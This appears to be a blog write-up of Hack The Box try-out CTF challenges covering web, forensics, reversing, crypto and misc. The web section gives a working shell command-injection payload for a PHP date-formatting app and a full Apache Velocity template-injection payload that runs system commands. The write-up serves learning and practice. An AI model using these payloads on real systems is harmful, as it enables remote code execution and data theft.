---
layout: writeup
category: HTB
chall_description: 
points:
solves: 
tags: HTB web forensics rev crypto misc
date: 2024-06-24
comments: false
---


# Web

## TimeKROP

The site takes the format in time or date and prints the output based on that. Let's check the source and understand how the format is analyzed and used.

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

Right off the bat, we see user input being added to the command without proper sanitization and executed as a date command. This results in command injection.


if you check the command, it puts user input in `'$format'` so we have to escape that by `'`, write the command we need to execute, and have to make sure to run a command which has an unclosed quote. We only get output of the last running command. We can use `grep` where test can be provided in quotes. Final payload: `format=%Y-%m-%d' | cat ../flag | grep 'HTB`

![Branching](/assets/CTFs/HTB-try-out/TimeKROP.png)


Flag: `HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_969cb517514ff958570f61a337bca4f9}`



## Flag Command

Api enumeration revealed a secret endpoint **Blip-blop, in a pickle with a hiccup! Shmiggity-shmack**.

```shell
┌──(kali㉿kali)-[~/…/CTF/HTB_try_out/web/FlagCommand]
└─$ curl http://94.237.58.224:42477/api/options
{
  "allPossibleCommands": {
    "1": [
      "HEAD NORTH",
      "HEAD WEST",
      "HEAD EAST",
      "HEAD SOUTH"
    ],
    "2": [
      "GO DEEPER INTO THE FOREST",
      "FOLLOW A MYSTERIOUS PATH",
      "CLIMB A TREE",
      "TURN BACK"
    ],
    "3": [
      "EXPLORE A CAVE",
      "CROSS A RICKETY BRIDGE",
      "FOLLOW A GLOWING BUTTERFLY",
      "SET UP CAMP"
    ],
    "4": [
      "ENTER A MAGICAL PORTAL",
      "SWIM ACROSS A MYSTERIOUS LAKE",
      "FOLLOW A SINGING SQUIRREL",
      "BUILD A RAFT AND SAIL DOWNSTREAM"
    ],
    "secret": [
      "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
    ]
  }
}
```

Giving secret as input to get the flag.

![Branching](/assets/CTFs/HTB-try-out/flag-command.png)



## Labyrinth Linguist

The site takes user input and outputs the converted text. Let's take a look at the source code.

```java
public static String readFileToString(String filePath, String replacement) throws IOException {
    StringBuilder content = new StringBuilder();
    BufferedReader bufferedReader = null;

    try {
        bufferedReader = new BufferedReader(new FileReader(filePath));
        String line;
        
        while ((line = bufferedReader.readLine()) != null) {
            line = line.replace("TEXT", replacement);
            content.append(line);
            content.append("\n");
        }
    } finally {
        if (bufferedReader != null) {
            try {
                bufferedReader.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    return content.toString();
}
```

This function reads the index.html file and replaces the TEXT string with user input. It is just a header that is displayed to the given class fire `<h2 class="fire">TEXT</h2>`. User input is used as a velocity template, as input is not sanitized, this is screaming server-side template injection.

I could use `#parse()` to load any file but the name of the flag file is randomized in the entrypoint.sh `mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt`. 

After some digging, I found the following template injection [Apache Velocity Server-Side Template Injection](https://iwconnect.com/apache-velocity-server-side-template-injection/). 
```velocity

#set($s="")
#set($stringClass=$s.getClass())
#set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder"))
#set($inputStreamClass=$stringClass.forName("java.io.InputStream"))
#set($readerClass=$stringClass.forName("java.io.Reader"))
#set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader"))
#set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader"))
#set($collectorsClass=$stringClass.forName("java.util.stream.Collectors"))
#set($systemClass=$stringClass.forName("java.lang.System"))
#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("ls -ls /"))
#set($null=$process.waitFor() )
#set($inputStream=$process.getInputStream())
#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
#set($stringBuilder=$stringBuilderConstructor.newInstance())
#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))

$output
```

Using this exploit I was able to get remote code execution and we can get the file listing.
![Branching](/assets/CTFs/HTB-try-out/Labyrinth-Linguist1.png)


And we got the flag!
![alt text](/assets/CTFs/HTB-try-out/Labyrinth-Linguist2.png)


Flag: `HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_559f0b6b15b856e0ca607b5258d4f5d2}`


 

# Forensics

## Phreaky

### description
> In the shadowed realm where the Phreaks hold sway,
> A mole lurks within, leading them astray.
> Sending keys to the Talents, so sly and so slick,
> A network packet capture must reveal the trick.
> Through data and bytes, the sleuth seeks the sign,
> Decrypting messages, crossing the line.
> The traitor unveiled, with nowhere to hide,
> Betrayal confirmed, they'd no longer abide.

We get a Pcap file for this one. From the description, we can tell we can extract some data and decrypt it.
Analyzing the file in Wireshark revealed many SMTP packets with data fragments. In total, 15 zip files were transferred as multipart. We also get the password of the zip file in the packet.

![Branching](/assets/CTFs/HTB-try-out/phreaky1.png)


Zip files are sent in base64 encoding. Using the filter `smtp and frame.len>1000` we can filter out all the zip files, now it's a matter of extracting them. 

![Branching](/assets/CTFs/HTB-try-out/phreaky2.png)


My intense need to automate tasks made me waste hours on this - talk about irony. Initially, I decided to use Pyshark to extract all packets based on the `SMTP` filter. It worked but the first ten extracted files were corrupted, the rest five were unzipped by using the password and revealed part of a PDF file. After scratching my head for hours I found out that the Initial files were corrupted because TCP breaks down data into more than one packet for large files and the Wireshark filter only shows the `SMTP` packet not the `TCP` packet sent after, which contained the remaining zip file data. 

To solve this issue I had to use `dpkt` to analyze the pcap file at low-level. Starting with all `tcp` connections I filtered them based on `\r\n\r\n` which was present in all the data packets and also in HTTP packets so had to filter them out.

```py
def reconstruct_smtp_messages(pcap_file):
    with open(pcap_file, 'rb') as f:
        pcap = dpkt.pcap.Reader(f)
        connections = {}  # To store ongoing TCP connections
        for ts, buf in pcap:
            eth = dpkt.ethernet.Ethernet(buf)
            if isinstance(eth.data, dpkt.ip.IP):
                ip = eth.data
                if isinstance(ip.data, dpkt.tcp.TCP):
                    tcp = ip.data
                    if tcp.dport == 80 or tcp.dport == 443 or tcp.sport == 80 or tcp.sport == 443:
                        continue  # Skip HTTP/HTTPS packets

                    # Define a tuple to represent the connection (src_ip, src_port, dst_ip, dst_port)
                    connection = (ip.src, tcp.sport, ip.dst, tcp.dport)
                    
                    # Check if we've seen this connection before
                    if connection not in connections:
                        connections[connection] = b''  # Initialize buffer for this connection
                    
                    # Append TCP payload to the connection buffer
                    connections[connection] += tcp.data
                    
                    # Check if we have a complete SMTP message (example: ending with '\r\n\r\n')
                    smtp_data = connections[connection]
                    if b'\r\n\r\n' in smtp_data: 
                        data_connect(smtp_data) 
                        del connections[connection]

```


Using this function we can extract all zip file data fully. After that, we just have to put the data in a zip file, extract them, and combine all extracted parts into one PDF.

```py
pcap_file = 'phreaky.pcap'
reconstruct_smtp_messages(pcap_file) 
extract_to_dir = "./zips_extracted/" 
for count, (zip_content, password) in enumerate(zip(complete_data, passwords)):
    count+=1
    zip_file_path = f"./zips/{count}_{password}.zip.{str(count).zfill(3)}" 
    create_zip(zip_content, zip_file_path)
    unzip_file_with_password(zip_file_path, extract_to_dir, password)
```

This script will create a zip file for each part and extract them in seperate directory. You can check out the full solve script here. [Github Link](https://github.com/Harshad07/CTF-Solutions/blob/main/Misc/HTB-Try-Out-CTF/phreaky/solve.py)

To combine all pdf parts we can run `cat ./zips_extracted/* > phreaks_plan.pdf`.
And we get the flag

![Branching](/assets/CTFs/HTB-try-out/phreaky3.png)


Flag: `HTB{Th3Phr3aksReadyT0Att4ck}`


It was fun solving this challenge, especially analyzing the Pcap file. This data breaking down in more than one TCP packet seems like a common issue, maybe I will work on the solve script to make some tool to analyze pcap files at a low level with more functionalities and easy implementation to solve this issue. 


# Reversing

## LootStash

```shell
┌──(kali㉿kali)-[~/practice/CTF/HTB_try_out/rev_lootstash]
└─$ strings -n 10 stash | grep HTB
HTB{n33dl3_1n_a_l00t_stack}

```
Flag: `HTB{n33dl3_1n_a_l00t_stack}`


# Crypto: Dynastic

Its using TRITHEMIUS_CIPHER you can easily decrypt it using any online tool or just change the given source code with `ech = from_identity_map(chi - i)` and this should decrypt the text.

Flag: `HTB{DID_YOU_KNOW_ABOUT_THE_TRITHEMIUS_CIPHER?!_IT_IS_SIMILAR_TO_CAESAR_CIPHER}`


# Misc

## Character

Just a basic challenge, we can use `pwntools` to automate this task.

```py
from pwn import *
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    return remote(sys.argv[1], sys.argv[2], *a, **kw) 

io = start()
flag = ""
count = 0
while "}" not in flag: 
    io.recvuntil(b": ")
    io.sendline(str(count).encode())
    io.recvuntil(b": ")
    char = io.recvline().strip()
    flag += char.decode()
    count+=1
    print(flag)
    
print(f"Flag: {flag}")
io.interactive()

```

Run the code with `python3 solve.py REMOTE $IP $PORT` to get the flag.

Flag: `HTB{tH15_1s_4_r3aLly_l0nG_fL4g_i_h0p3_f0r_y0Ur_s4k3_tH4t_y0U_sCr1pTEd_tH1s_oR_els3_iT_t0oK_qU1t3_l0ng!!}`


## Stop Drop and Roll

Another basic challenge, we will use pwntools for this as well. We have to send response based on the server's request, `GORGE=STOP, PHREAK=DROP, FIRE=ROLL`. 

```py
from pwn import *

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    return remote(sys.argv[1], sys.argv[2], *a, **kw) 

def response_data(req):
    res = ""
    for i in range(len(req)):
        if i == 0:
            res = commands[req[0]]
        else:
            res += "-" + commands[ req[i] ]  
    return res

io = start() 
commands = { "GORGE" : "STOP", "PHREAK" : "DROP" ,  "FIRE" : "ROLL" }
io.sendlineafter(b"Are you ready? (y/n) " , b"y")
req = io.recvlines(2)[1].decode().split(", ")  
res = response_data(req) 
io.sendlineafter(b"What do you do? ", res.encode() )

while True:
    recv = io.recvline().decode().strip()
    if "HTB" in recv:
        print(recv)
        break
    req = recv.split(", ")  
    res = response_data(req) 
    #print(f"{recv} : {res}") # Debug
    io.sendlineafter(b"What do you do? ", res.encode() )

```

Run the code with `python3 solve.py REMOTE $IP $PORT` to get the flag.

Flag: `HTB{1_wiLl_sT0p_dR0p_4nD_r0Ll_mY_w4Y_oUt!}` 


